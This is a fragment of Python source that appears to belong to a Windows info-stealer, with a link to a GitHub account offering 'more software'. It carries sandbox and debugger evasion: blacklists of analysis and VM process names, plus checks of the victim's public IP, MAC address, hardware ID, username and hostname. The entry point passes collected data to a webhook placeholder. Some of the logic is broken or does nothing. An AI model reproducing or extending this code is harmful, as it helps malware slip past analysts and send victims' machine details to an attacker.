            "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "qemu-ga",
            "joeboxcontrol", "ksdumperclient", "ksdumper", "joeer", argv[0]]

        self.check_process()
        if self.get_network():
            debugging = False
        if self.get_system():
            debugging = False

    def check_process(self) -> bool:
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                try:
                    pass
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    def get_network(self) -> bool:
        global ip, mac, github

        ip = requests.get('https://api.ipify.org').text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        github = "https://github.com/Purora (FOR MORE SOFTWARE)"

        if ip in self.blackListedIPS:
            return False
        if mac in self.blackListedMacs:
            return False

    def get_system(self) -> bool:
        global hwid, username, hostname

        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()

        if hwid in self.blackListedHWIDS:
            return False
        if username in self.blackListedUsers:
            return False
        if hostname in self.blackListedPCNames:
            return False

    def self_destruct(self) -> None:
        program(__WEBHOOK_HERE__)



if __name__ == '__main__' and os.name == "nt":
    program(__WEBHOOK_HERE__)